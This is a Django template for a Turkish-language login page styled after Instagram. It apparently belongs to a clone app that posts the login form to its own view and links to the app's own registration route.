{% extends 'base/base.html' %}

{% block title %}Instagram - Login{% endblock %}

{% block content %}
<div class="row">
    <div class="col-sm-6 mt-4 d-none d-sm-block">
        <img class="rounded float-end" src="https://assets-global.website-files.com/5fac161927bf86485ba43fd0/63f491d6e8a97e3434aa6045_Screen%20Shot%202023-02-21%20at%2011.41.07.webp" alt="" width="350px" height="550px">
    </div>
    <div class="col-sm-6">
        <div class="card mt-5" style="width: 20rem;">
            <div class="card-body">
                <div class="text-center" aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;">
                    <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yh/r/IS7e616CiR2.png&quot;); background-position: 0px 0px; background-size: 176px 258px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
                </div>
                <div>
                    {% for message in messages %}
                         <div class="alert alert-danger" role="alert">
                             <i class="fas fa-exclamation-circle"></i> {{ message }}
                        </div>
                    {% endfor %}
                </div>
                <form method="post">
                    {% csrf_token %}
                    <div class="mb-3">
                        <input type="text" name="username" class="form-control bg-light" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
                    </div>
                    <div class="mb-3">
                        <input type="password" name="password" class="form-control bg-light" placeholder="Şifre">
                    </div>
                    <div class="d-grid gap-2 mb-3">
                        <button type="submit" class="btn btn-primary">Giriş Yap</button>
                    </div>
                </form>
                <p class="text-center text-body-secondary">⎯⎯⎯⎯⎯⎯ YA DA ⎯⎯⎯⎯⎯</p>
                <div class="text-center mb-2">
                    <a href="#" class="text-decoration-none text-primary">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-facebook me-2" viewBox="0 0 16 16">
                            <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951" />
                        </svg>Facebook ile giriş yap
                    </a>
                </div>
                <a href="#" class="text-decoration-none text-dark">
                    <p class="my-auto text-center fs-6">Şifreni mi unuttun?</p>
                </a>
            </div>
        </div>
        <div class="card mt-3" style="width: 20rem;">
            <div class="card-body">
                <p class="text-center my-auto">Hesabın yok mu? <a href="{% url 'post:register' %}" class="text-decoration-none text-primary">Kaydol</a></p>
            </div>
        </div>
        <div class="card mt-3 border-light" style="width: 20rem;">
            <p class="py-auto text-center">Uygulamayı indir.</p>
        </div>
        <div class="card border-light" style="width: 20rem;">
            <div class="ms-5">
                <a href="#"><img width="120px" src="https://static.cdninstagram.com/rsrc.php/v3/yp/r/XUCupIzGmzB.png" alt=""> </a>
                <a class="ms-2" href="#"><img width="95px" src="https://static.cdninstagram.com/rsrc.php/v3/yf/r/BFthdeAc5KC.png" alt=""> </a>
            </div>
        </div>
    </div>
</div>
{% endblock %}
